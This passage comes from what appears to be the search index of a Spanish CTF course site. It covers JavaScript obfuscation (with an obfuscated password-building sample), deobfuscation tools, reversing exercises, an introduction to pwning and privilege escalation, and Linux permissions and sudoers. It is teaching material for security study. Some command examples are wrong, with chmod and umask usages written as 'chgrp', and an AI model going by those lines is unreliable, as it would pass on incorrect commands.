class=\"s1\"\u003e\u0026#39;\\x31\\x30\\x33\\x36\\x39\\x35\\x6f\\x67\\x54\\x6e\\x6f\\x4a\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x33\\x63\\x72\\x65\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x70\\x33\\x72\\x53\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x36\\x36\\x36\\x36\\x54\\x6e\\x52\\x54\\x6a\\x73\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x74\\x50\\x34\\x73\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x32\\x37\\x30\\x38\\x36\\x38\\x47\\x61\\x4b\\x61\\x50\\x5a\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x35\\x38\\x6d\\x77\\x67\\x68\\x6e\\x50\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x32\\x39\\x35\\x33\\x37\\x79\\x54\\x62\\x62\\x42\\x58\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x4d\\x79\\x24\\x75\u0026#39;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003e_0x3683a0\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x45f1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003e_0x45f1\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2320c9\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0xd2858e\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_0x2320c9\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2320c9\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10c\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003e_0xfb5e0e\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0xfb5e\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2320c9\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003e_0xfb5e0e\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}(\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x165719\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x10ce39\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x45f1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n            \u003cspan class=\"k\"\u003etry\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003e_0x26183c\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x118\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e+-\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10c\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10f\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e+-\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x113\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e+-\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10e\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e+-\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x112\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x116\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e+-\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x119\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e*-\u003c/span\u003e\u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x2163ea\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x110\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x26183c\u003c/span\u003e\u003cspan class=\"o\"\u003e===\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x10ce39\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"nx\"\u003e_0x165719\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;push\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x165719\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;shift\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]());\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x3d8331\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003e_0x165719\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;push\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x165719\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;shift\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]());\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0xfb5e\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x3046a\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x3683a0\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10d\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x3683a0\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x115\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x3683a0\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x114\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x3683a0\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x117\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003e_0x3683a0\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x111\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\x64\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eA diferencia de la técnica anterior, es muy difícil para una persona saber qué es lo que está pasando y cómo se\nconstruye la variable.\u003c/p\u003e\n\u003ch2 id=\"dead-branches\"\u003eDead Branches\u003c/h2\u003e\n\u003cp\u003eOtra forma de obfuscar el código es insertando ramas condicionales (declaraciones \u003ccode\u003eif\u003c/code\u003e, \u003ccode\u003eelse\u003c/code\u003e, \u003ccode\u003eswitch\u003c/code\u003e, \u003ccode\u003ewhile\u003c/code\u003e, etc),\nde las cuales una nunca será ejecutada, pero no es fácil determinar cuál a primera vista.\nLas ramas \u003cem\u003e\u0026ldquo;muertas\u0026rdquo;\u003c/em\u003e se llenan de código similar al código real para hacer difícil el proceso de deobfuscación.\u003c/p\u003e\n\u003cp\u003eEsta técnica muchas veces va acompañada del uso de \u003cem\u003ecódigo muerto\u003c/em\u003e. No se utiliza ramas condicionales en este caso,\nsino que se inserta instrucciones, las cuales son ejecutadas, pero no tienen ninguna influencia sobre el resultado\no el funcionamiento del programa en general. La idea es confundir aún más a las personas tratando de reversar\nel código.\u003c/p\u003e\n\u003cp\u003eTodo esto produce un código que parece ser muy complejo, con muchos caminos de ejecución, los cuales son\nintencionalmente poco claros.\u003c/p\u003e\n\u003ch2 id=\"cómo-deobfuscar-código\"\u003e¿Cómo Deobfuscar Código?\u003c/h2\u003e\n\u003cp\u003eLamentablemente no existen una fórmula mágica para deobfuscar código obfuscado. Hay herramientas que pueden\nayudar a hacerlo, pero casi nunca logran obtener algo exactamente igual al código original.\nPor esto, frecuentemente se debe hacer un análisis manual del código, revisando línea por línea y utilizando\nmúltiples deobfuscadores.\u003c/p\u003e\n\u003cp\u003eLos deobfuscadores normalmente están hechos para funcionar con un lenguaje en particular, y solo pueden\ndeobfuscar ciertas técnicas. A continuación se encuentra una lista de algunos deobfuscadores que les pueden ser\nútiles, sin embargo, existen muchos otros que funcionan igual de bien o incluso mejor.\u003c/p\u003e\n\u003ch3 id=\"javascript\"\u003eJavaScript\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://lelinhtinh.github.io/de4js/\"\u003ede4js\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://jsnice.org/\"\u003eJS Nice\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/javascript-unobfuscator\"\u003edCode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://codeamaze.com/code-beautifier/javascript-deobfuscator\"\u003eCode Amaze\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://deobfuscatejavascript.com/\"\u003eDeobfuscate JavaScript\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"python\"\u003ePython\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/extremecoders-re/bytecode_simplifier\"\u003eBytecode Simplifier\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://pypi.org/project/deopy/\"\u003edeopy\u003c/a\u003e (Python3.6+)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"php\"\u003ePHP\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.unphp.net/\"\u003eUnPHP\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/simon816/PHPDeobfuscator\"\u003ePHPDeobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Antelox/FOPO-PHP-Deobfuscator\"\u003eFOPO PHP Deobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://jonhburn2.freehostia.com/decode/\"\u003ePHP Deobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"java\"\u003eJava\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/java-deobfuscator/deobfuscator\"\u003eDeobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jdec.app/\"\u003ejdec\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/D3Hunter/deobfuscator\"\u003eAll-in-one deobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"net\"\u003e.NET\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/de4dot/de4dot\"\u003ede4dot\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/NotPrab/.NET-Deobfuscator\"\u003eLista de deobfuscadores opensource\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:33,href:"/docs/reversa/ejercicios/",title:"Ejercicios Reversing",description:null,content:"\u003ch2 id=\"decompilación\"\u003eDecompilación\u003c/h2\u003e\n\u003ch3 id=\"hack-the-box\"\u003eHack The Box\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Baby-RE\"\u003eBaby RE\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"try-hack-me\"\u003eTry Hack Me\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/reverselfiles\"\u003eReversing ELF\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"deobfuscación\"\u003eDeobfuscación\u003c/h2\u003e\n\u003ch3 id=\"hack-the-box-1\"\u003eHack The Box\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Query\"\u003eQuery\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Longbottom's-Locker\"\u003eLongbottom\u0026rsquo;s Locker\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:34,href:"/docs/pwning/",title:"Pwning",description:null,content:""},{id:35,href:"/docs/pwning/intro/",title:"Intro al Pwning",description:null,content:"\u003cp\u003e\u003cem\u003ePwn\u003c/em\u003e (Suele pronunciarse como la palabra española \u0026ldquo;pon\u0026rdquo;) es una palabra de la jerga \u003ca href=\"https://en.wikipedia.org/wiki/Leet\"\u003eleetspeak\u003c/a\u003e, nacida de una derivación del término \u003cem\u003eOwn\u003c/em\u003e (Poseer en inglés), y se refiere en este contexto a la capacidad de unx hacker de controlar una máquina que no es suya a partir del aprovechamiento de vulnerabilidades en ella.\u003c/p\u003e\n\u003cp\u003eEn general, los desafíos de \u003cem\u003ePwning\u003c/em\u003e son bastante variados y pueden tener partes de otras categorías ya vistas (reversing, web, crypto, etc), pero se parecen en que el resultado final consiste en adquirir permisos de superusuario en una máquina. En esta unidad, nos enfocaremos en desafíos de pwning relacionados con escalar privilegios en Linux y con explotar vulnerabilidades básicas en algunos servicios.\u003c/p\u003e\n\u003cp\u003eLa unidad entonces se dividirá en dos partes\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEscalamiento de privilegios básico\u003c/strong\u003e: Partiremos explicando algunas técnicas de escalamiento de privilegios a partir de programas ejecutables en una máquina Linux, contando solamente con usuarios con privilegios limitados.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eBuffer Overflow\u003c/strong\u003e: Conseguir acceso de superusuario a partir de la explotación de una vulnerabilidad conocida como \u0026ldquo;buffer overflow\u0026rdquo; en entradas de programas y servicios con privilegios ejecutados por máquinas remotas.\u003c/p\u003e\n\u003cp\u003eNo tocaremos vulnerabilidades de control de flujo avanzadas, pero intentaremos dejar bibliografía para que puedan investigar por su cuenta.\u003c/p\u003e\n"},{id:36,href:"/docs/pwning/permisos-linux/",title:"Permisos de Usuario en Linux",description:null,content:"\u003ch2 id=\"permisos-de-usuario-en-linux\"\u003ePermisos de Usuario en Linux\u003c/h2\u003e\n\u003cp\u003eEsta sección explica de forma breve el sistema de permisos en sistemas de archivo utilizados comúnmente en sistemas operativos Linux.\u003c/p\u003e\n\u003ch3 id=\"usuarios-y-grupos\"\u003eUsuarios y Grupos\u003c/h3\u003e\n\u003cp\u003eEn estos sistemas operativos, cada usuario tiene un ID definido en el archivo \u003ccode\u003e/etc/passwd\u003c/code\u003e. En algunas distribuciones de Linux, este ID crece de forma incremental, mientras que en otras se reservan los UID inferiores a 1000 para \u0026ldquo;metausuarios\u0026rdquo; (usuarios usados por procesos de Linux) y los superiores para usuarios normales.\u003c/p\u003e\n\u003cp\u003eEl SO también permite contar con \u0026ldquo;grupos\u0026rdquo;, los cuales están definidos en el archivo \u003ccode\u003e/etc/group\u003c/code\u003e y también tienen un ID característico. Un usuario puede estar en 0 o más grupos sin problemas. Algunos sistemas crean a cada usuario un grupo con el mismo ID (pero en el archivo \u003ccode\u003e/etc/group\u003c/code\u003e) y agregan al usuario a ese grupo.\u003c/p\u003e\n\u003cp\u003eLos grupos suelen servir para definir permisos tanto en archivos como en ejecución de comandos (como cuando se agrega un usuario al grupo \u003ccode\u003ewheel\u003c/code\u003e para tener permisos de superusuario). Más adelante explicaremos como se hace esto.\u003c/p\u003e\n\u003ch3 id=\"owners-y-groups-de-archivos\"\u003eOwners y Groups de archivos\u003c/h3\u003e\n\u003cp\u003eEn sistemas de archivo compatibles con Linux, cada archivo creado tiene las siguientes propiedades:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUn \u003ccode\u003eowner\u003c/code\u003e o dueño del archivo\u003c/li\u003e\n\u003cli\u003eUn \u003ccode\u003egroup\u003c/code\u003e o grupo con permisos en el archivo\u003c/li\u003e\n\u003cli\u003eUn set de \u003ccode\u003epermisos de archivo\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"agregar-remover-de-un-grupo-a-un-usuario\"\u003eAgregar-Remover de un grupo a un usuario\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAgregar Usuario a grupo\u003c/strong\u003e \u003ccode\u003egpasswd -a USER GROUP\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEliminar Usuario a grupo\u003c/strong\u003e \u003ccode\u003egpasswd -d USER GROUP\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"permisos-en-archivos-y-carpetas\"\u003ePermisos en Archivos y Carpetas\u003c/h3\u003e\n\u003cp\u003eCada archivo o carpeta posee 9 bits para definir permisos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e3 bit están asociados al \u003ccode\u003eowner\u003c/code\u003e del archivo\u003c/li\u003e\n\u003cli\u003e3 bit están asociados a personas del \u003ccode\u003egroup\u003c/code\u003e del archivo\u003c/li\u003e\n\u003cli\u003e3 bit están asociados a todos los demás usuarios (\u003ccode\u003eother\u003c/code\u003e) (o sea, que no cumplan alguna de las otras dos condiciones).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode\u003e| r w x | r w x | r w x |\n| x x x | x x x | x x x |\n| Owner | Group | Other |\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLas acciones de permisos son las siguientes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRead\u003c/strong\u003e (R) Permite leer el archivo o acceder a la carpeta.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWrite\u003c/strong\u003e (W) Permite editar el archivo o crear nuevos archivos en la carpeta.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExecute\u003c/strong\u003e (X) Permite ejecutar el archivo o listar los archivos internos de la carpeta.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLos permisos suelen ser representados como números en octal:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e| r w x | r w x | r w x |\n| 1 0 0 | 1 1 1 | 0 0 0 |\n| Owner | Group | Other |\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLo anterior corresponde al número \u003ccode\u003e470\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eSi el bit está marcado con un 1, significa que el usuario puede ejecutar esa acción.\u003c/p\u003e\n\u003ch3 id=\"comandos-para-cambiar-permisos\"\u003eComandos para cambiar permisos\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003echown\u003c/code\u003e: Permite cambiar el \u003ccode\u003eowner\u003c/code\u003e (y group si se adjunta el GID después del UID y \u003ccode\u003e:\u003c/code\u003e) de un archivo/carpeta. Necesitas hacerlo como \u003ccode\u003eroot\u003c/code\u003e o con \u003ccode\u003esudo\u003c/code\u003e. La flag \u003ccode\u003e-R\u003c/code\u003e ejecuta la operación de forma recursiva.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003echown 1234:1234 file\u003c/code\u003e cambia el \u003ccode\u003eUID\u003c/code\u003e de \u003ccode\u003efile\u003c/code\u003e a \u003ccode\u003e1234\u003c/code\u003e y el \u003ccode\u003eGID\u003c/code\u003e de \u003ccode\u003efile\u003c/code\u003e a \u003ccode\u003e1234\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003echgrp\u003c/code\u003e: Permite cambiar el \u003ccode\u003egroup\u003c/code\u003e de un archivo/carpeta. Necesitas hacerlo como \u003ccode\u003eroot\u003c/code\u003e o con \u003ccode\u003esudo\u003c/code\u003e. La flag \u003ccode\u003e-R\u003c/code\u003e ejecuta la operación de forma recursiva.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003echgrp 1234 file\u003c/code\u003e cambia el \u003ccode\u003eGID\u003c/code\u003e de \u003ccode\u003efile\u003c/code\u003e a \u003ccode\u003e1234\u003c/code\u003e y deja su \u003ccode\u003eUID\u003c/code\u003e como antes.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003echmod\u003c/code\u003e: Permite cambiar los permisos de un archivo/carpeta.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003echgrp 740 file\u003c/code\u003e cambia los permisos del archivo \u003ccode\u003efile\u003c/code\u003e a \u003ccode\u003eRWX\u003c/code\u003e para su \u003ccode\u003eowner\u003c/code\u003e, \u003ccode\u003eR\u003c/code\u003e para su \u003ccode\u003egroup\u003c/code\u003e y nada para \u003ccode\u003eother\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eumask\u003c/code\u003e: Define los permisos por defecto al crear archivos en una sesión de terminal. Los permisos por defecto son el inverso del valor configurado con \u003ccode\u003eumask\u003c/code\u003e.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003echgrp 022\u003c/code\u003e setea como permiso por defecto \u003ccode\u003e644\u003c/code\u003e al crear un nuevo archivo.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003els -ln\u003c/code\u003e permite ver los archivos de una carpeta y sus permisos en formato numérico. Si sacas el argumento \u003ccode\u003en\u003c/code\u003e se ve el nombre del usuario o grupo.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"superusuarios\"\u003eSuperusuarios\u003c/h3\u003e\n\u003cp\u003eEn sistemas basados en Unix, existe un usuario con privilegios totales, denominado superusuario. En general es llamado \u003ccode\u003eroot\u003c/code\u003e y posee como \u003ccode\u003euser id\u003c/code\u003e el número 0. De hecho, si cambias el \u003ccode\u003euser id\u003c/code\u003e de cualquier usuario a 0 en \u003ccode\u003e/etc/passwd\u003c/code\u003e, éste se comportara como si fuera el usuario \u003ccode\u003eroot\u003c/code\u003e. Sin embargo, esto solo transformaría al otro usuario en \u003ccode\u003eroot\u003c/code\u003e y no permitiría crear dos usuarios separados que tengan permisos de superusuario.\u003c/p\u003e\n\u003cp\u003ePara resolver este problema, existe un comando llamado \u003ccode\u003esudo\u003c/code\u003e, el cual permtie ejecutar otros comandos que requieran privilegios de superusuario si y solo sí se está incluído en un archivo especial: \u003ccode\u003e/etc/sudoers\u003c/code\u003e. Varios sistemas operativos tienen configurado este archivo por defecto para que los usuarios incluidos en el grupo \u003ccode\u003esudo\u003c/code\u003e o \u003ccode\u003ewheel\u003c/code\u003e puedan ejecutar comandos de superusuario, pero nada evita que uno pueda editar \u003ccode\u003e/etc/sudoers\u003c/code\u003e para cambiar este comportamiento.\u003c/p\u003e\n\u003ch4 id=\"archivo-etcsudoers\"\u003eArchivo \u003ccode\u003e/etc/sudoers\u003c/code\u003e\u003c/h4\u003e\n\u003cp\u003eEl archivo \u003ccode\u003e/etc/sudoers\u003c/code\u003e tiene una sintaxis especial para permitir a un usuario, a un grupo de usuarios o a todos los usuarios ejecutar uno o más comandos con permisos de 